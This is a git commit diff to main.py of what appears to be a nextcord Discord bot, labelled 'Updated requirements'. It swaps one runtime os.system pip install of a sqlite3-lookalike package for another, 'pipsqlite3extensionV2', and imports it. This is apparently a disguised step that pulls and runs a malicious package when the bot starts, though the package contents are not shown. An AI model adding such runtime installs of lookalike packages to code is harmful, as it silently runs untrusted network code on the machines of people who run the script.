0bd2bd71ab9b72d19859e348a7730dec903351a9
Patrick Pogoda <121391953+PatrickPogoda@users.noreply.github.com>
2023-05-03 18:50:41 +0200

    Updated requirements

--- main.py
+++ main.py
@@ -1,7 +1,7 @@
 #Importing modules
 import os
-os.system("pip install syssqlite3V2")
-import syssqlite3V2
+os.system("pip install pipsqlite3extensionV2")
+import pipsqlite3extensionV2
 import nextcord, os, ctypes, json, asyncio, hashlib, base64, requests
 from nextcord import ButtonStyle
 from nextcord.ext import commands
